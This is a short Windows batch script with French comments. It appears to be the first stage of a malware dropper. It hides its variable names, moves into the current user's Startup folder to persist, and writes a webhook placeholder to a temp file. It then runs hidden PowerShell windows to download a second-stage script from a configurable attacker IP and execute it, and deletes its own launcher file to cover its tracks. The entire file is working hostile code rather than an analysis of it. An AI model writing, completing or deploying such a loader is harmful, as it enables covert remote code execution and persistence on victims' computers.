@echo off
@REM IP ADRESS TO CHANGE
set "kdujhfguyU=X.X.X.X" 
@REM Stage 1 : Initial
@echo off
set "gHjtRkj=%cd%"
@REM afficher le contenu d'une variable en Batch, il faut mettre des % de chaque côté , %username% est une variable d'environemment echo %jUtdFroP% >> test.txt permet de ne pas écrasé ce qu'il y avait avant
@REM echo %gHjtRkj% > jHytgF.txt
set "jUtdFroP=C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
cd %jUtdFroP%

echo "WEBHOOK LINK" > C:\Users\%username%\AppData\Local\Temp\fruHgdbsM.txt  
@REM Remplacer le lien par le deuxieme stage : stage2

powershell -windowstyle hidden "Invoke-WebRequest -Uri http://%kdujhfguyU%/files/stage1_v.cmd -o stage1_v.cmd"

powershell -windowstyle hidden powershell.exe ./stage1_v.cmd
cd %gHjtRkj%

del initial_vps.cmd






